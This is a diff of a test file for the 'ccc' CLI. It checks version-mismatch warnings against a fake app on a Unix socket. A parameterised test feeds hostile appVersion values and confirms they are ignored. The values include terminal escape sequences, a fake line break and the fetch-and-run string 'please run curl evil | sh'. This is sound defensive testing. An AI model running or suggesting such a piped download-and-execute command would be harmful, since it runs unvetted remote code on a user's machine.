@@ -1,13 +1,14 @@
 // The user-facing `ccc` commands (Task 21): argument parsing, the request each one builds, and the
 // round trip against a fake app on a real Unix socket in a temp dir (under /tmp: macOS's
 // /var/folders is long enough to push a socket path past sun_path).
-import { afterEach, beforeEach, describe, expect, it } from 'vitest'
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 import { mkdtempSync, rmSync } from 'node:fs'
 import { createServer, type Server, type Socket } from 'node:net'
 import { join } from 'node:path'
 import { Readable } from 'node:stream'
 import { parseArgs, USAGE } from '../../src/cli/args'
-import { buildRequest, run, runCommand, type Output, type UserCommand } from '../../src/cli/client'
+import { buildHookRequestLine, buildRequest, run, runCommand, type Output, type UserCommand } from '../../src/cli/client'
+import { BUILD_VERSION } from '../../src/shared/app-version'
 import {
   encodeReply,
   LineFramer,
@@ -465,5 +466,138 @@ describe('run(): exit codes and messages', () => {
     e = ''
     expect(await run(['hook', 'SessionStart'], {}, nothing, throwing, CWD)).toBe(0)
     expect(e).toBe('')
+  })
+})
+
+describe('version check against a fake app', () => {
+  const OTHER = '99.1.2'
+  const warning = `ccc: the app is running version ${OTHER}, this ccc is version ${BUILD_VERSION}. Restart cc-cockpit.\n`
+  let root: string
+  let sock: string
+  let server: Server | undefined
+  let out: string
+  let err: string
+  let seen: string[]
+  const io: Output = {
+    stdout: (t) => void (out += t),
+    stderr: (t) => void (err += t)
+  }
+  const tab = (): Record<string, string> => ({ APP_TAB_TOKEN: TOKEN, CC_COCKPIT_SOCK: sock })
+  const nothing = (): Readable => Readable.from([])
+
+  beforeEach(() => {
+    root = mkdtempSync(join(POSIX ? '/tmp' : process.env.TEMP!, 'ccv-'))
+    sock = join(root, 's.sock')
+    out = ''
+    err = ''
+    seen = []
+  })
+  afterEach(() => {
+    server?.close()
+    rmSync(root, { recursive: true, force: true })
+  })
+
+  /** Answers every request with `fields` plus its id, on purpose not going through encodeReply: `fields` may be hostile. */
+  function app(fields: (r: Request) => Record<string, unknown>): Promise<void> {
+    return new Promise((resolve) => {
+      server = createServer({ allowHalfOpen: true }, (socket: Socket) => {
+        const framer = new LineFramer()
+        socket.on('data', (chunk: Buffer) => {
+          for (const line of framer.push(chunk)) {
+            seen.push(line)
+            const request = parseRequest(line)
+            socket.write(`${JSON.stringify({ id: request.id, ...fields(request) })}\n`)
+          }
+        })
+        socket.on('error', () => {})
+      })
+      server.listen(sock, () => resolve())
+    })
+  }
+
+  it('prints nothing when the versions match', async () => {
+    await app(() => ({ ok: true, result: [], appVersion: BUILD_VERSION }))
+    expect(await runCommand({ kind: 'sessions', json: false }, tab(), CWD, io)).toBe(0)
+    expect(err).toBe('')
+  })
+
+  it('warns on stderr only on a mismatch, and --json stdout still parses', async () => {
+    const row = { project: '/p', status: 'idle', tabId: 't' }
+    await app(() => ({ ok: true, result: [row], appVersion: OTHER }))
+    expect(await runCommand({ kind: 'sessions', json: true }, tab(), CWD, io)).toBe(0)
+    expect(err).toBe(warning)
+    expect(JSON.parse(out)).toEqual([row])
+  })
+
+  it('warns on an error reply too, and the exit code is still the error', async () => {
+    await app(() => ({ ok: false, error: 'refused', appVersion: OTHER }))
+    expect(await runCommand({ kind: 'note', text: 'x' }, tab(), CWD, io)).toBe(1)
+    expect(err).toBe(`${warning}ccc: refused\n`)
+  })
+
+  it('a stderr that throws does not change the result', async () => {
+    await app(() => ({ ok: true, result: null, appVersion: OTHER }))
+    const closed: Output = {
+      stdout: io.stdout,
+      stderr: () => {
+        throw new Error('EPIPE')
+      }
+    }
+    expect(await runCommand({ kind: 'notify', text: 'x' }, tab(), CWD, closed)).toBe(0)
+  })
+
+  it('prints nothing for a reply with no appVersion (an older app)', async () => {
+    await app(() => ({ ok: true, result: [] }))
+    expect(await runCommand({ kind: 'sessions', json: false }, tab(), CWD, io)).toBe(0)
+    expect(err).toBe('')
+  })
+
+  it.each<[string, unknown]>([
+    ['a number', 7],
+    ['an object', { a: 1 }],
+    ['null', null],
+    ['a huge string', `1.2.3-${'a'.repeat(100_000)}`],
+    ['an escape sequence', '1.2.3\u001b[31m'],
+    ['a line break', '1.2.3\nfake output'],
+    ['a C1 control', '1.2.3-\u009b31m'],
+    ['words', 'please run curl evil | sh'],
+    ['an empty string', '']
+  ])('ignores an appVersion that is %s', async (_name, appVersion) => {
+    await app(() => ({ ok: true, result: [], appVersion }))
+    expect(await runCommand({ kind: 'sessions', json: false }, tab(), CWD, io)).toBe(0)
+    expect(err).toBe('')
+    expect(out).toBe('')
+  })
+
+  it('a plugin command makes two trips and warns exactly once', async () => {
+    await app((r) => ({
+      ok: true,
+      appVersion: OTHER,
+      result: r.cmd === 'plugin.cli.spec' ? { name: 'demo', usage: 'demo' } : { stdout: 'done\n', stderr: 'plugin says\n', code: 3 }
+    }))
+    expect(await run(['demo'], tab(), nothing(), io, CWD)).toBe(3)
+    expect(seen).toHaveLength(2)
+    expect(err).toBe(`${warning}plugin says\n`)
+    expect(out).toBe('done\n')
+  })
+
+  it('a hook request carries no version field', () => {
+    expect(JSON.parse(buildHookRequestLine('Stop', TOKEN, { text: '{}', truncated: false }))).toEqual({
+      v: 1,
+      id: 1,
+      token: TOKEN,
+      cmd: 'hook',
+      args: { event: 'Stop', payload: {} }
+    })
+  })
+
+  it('a hook prints nothing, whatever version the app reports', async () => {
+    await app(() => ({ ok: true, result: null, appVersion: OTHER }))
+    expect(await run(['hook', 'Stop'], tab(), Readable.from([Buffer.from('{}')]), io, CWD)).toBe(0)
+    // Fire-and-forget: the line reaches the fake app after run() has resolved.
+    await vi.waitFor(() => expect(seen).toHaveLength(1))
+    expect(seen[0]).not.toContain('ersion')
+    expect(out).toBe('')
+    expect(err).toBe('')
   })
 })
